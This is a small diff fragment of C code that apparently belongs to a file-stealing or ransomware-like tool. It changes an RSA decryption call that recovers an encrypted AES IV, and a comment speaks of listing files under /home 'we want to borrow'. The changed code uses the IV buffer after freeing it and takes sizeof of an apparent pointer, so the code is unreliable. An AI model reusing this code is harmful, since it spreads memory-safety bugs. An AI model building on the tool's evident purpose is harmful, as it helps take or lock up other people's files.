@@ -60,7 +60,7 @@ int main(){
 
     OPENSSL_free(encrypted_aes_key);
     OPENSSL_free(encrypted_iv);
-    decrpyt_RSA("key/private_key.pem", encrypted_iv, sizeof(encrypted_iv));
+    const unsigned char* decrypted_iv = decrypt_RSA("keys/private_key.pem", encrypted_iv, sizeof(encrypted_iv));
     //List all the files we want to borrow ;)
     /*
     const char *path = "/home";
